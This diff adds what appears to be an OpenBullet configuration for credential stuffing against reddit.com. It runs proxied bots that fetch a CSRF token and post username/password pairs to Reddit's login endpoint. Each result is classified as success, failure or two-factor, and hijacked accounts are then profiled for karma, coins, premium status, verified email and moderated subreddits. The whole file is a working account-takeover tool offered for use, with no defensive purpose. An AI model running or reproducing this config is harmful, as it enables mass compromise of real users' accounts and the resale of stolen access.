@@ -1,0 +1,137 @@
+[SETTINGS]
+{
+  "Name": "reddit.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-02T19:10:45.9847607+01:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Magma0007 REQUEST GET "https://www.reddit.com/u/<USER>/about.json" 
+  
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: none" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36" 
+
+#Magma0007 KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "email" 
+    KEY "karma" 
+  KEYCHAIN Failure OR 
+    KEY "{\"message\": \"Not Found\", \"error\": 404}" 
+
+#Magma0007 REQUEST GET "https://accounts.reddit.com" 
+  
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36" 
+
+#Magma0007 PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"csrf_token\" value=\"" "\">" -> VAR "TOKEN" 
+
+#Magma0007 REQUEST POST "https://accounts.reddit.com/login" 
+  CONTENT "csrf_token=<TOKEN>&otp=&password=<PASS>&dest=https%3A%2F%2Fwww.reddit.com&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "origin: https://accounts.reddit.com" 
+  HEADER "referer: https://accounts.reddit.com/" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36" 
+
+#Magma0007 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"reason\": \"INCORRECT_USERNAME_PASSWORD\", \"code\": 400, \"explanation\": \"incorrect username or password\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"dest\": \"https://www.reddit.com\"}" 
+  KEYCHAIN Custom "2FA" OR 
+    KEY "{\"details\": \"TWO_FA_REQUIRED\"}" 
+
+#Magma0007 REQUEST GET "https://www.reddit.com/u/<USER>/about.json" 
+  
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36" 
+
+#Magma0007 PARSE "<SOURCE>" JSON "premium" CreateEmpty=FALSE -> CAP "is_gold" 
+
+#Magma0007 PARSE "<SOURCE>" JSON "has_verified_email" CreateEmpty=FALSE -> CAP "email verified" 
+
+#Magma0007 PARSE "<SOURCE>" JSON "has_subscribed" CreateEmpty=FALSE -> CAP "has subscribtion" 
+
+#Magma0007 PARSE "<SOURCE>" JSON "total_karma" CreateEmpty=FALSE -> CAP "total_karma" 
+
+#Magma0007 PARSE "<SOURCE>" JSON "coins" CreateEmpty=FALSE -> CAP "coins" 
+
+#Magma0007 FUNCTION UnixTimeToDate "<Magma#0007>" -> CAP "CREATION DATE" 
+
+#Magma0007 REQUEST GET "https://www.reddit.com/user/<USER>/moderated_subreddits.json" 
+  
+  HEADER "sec-ch-ua: \"Chromium\";v=\"88\", \"Google Chrome\";v=\"88\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36" 
+
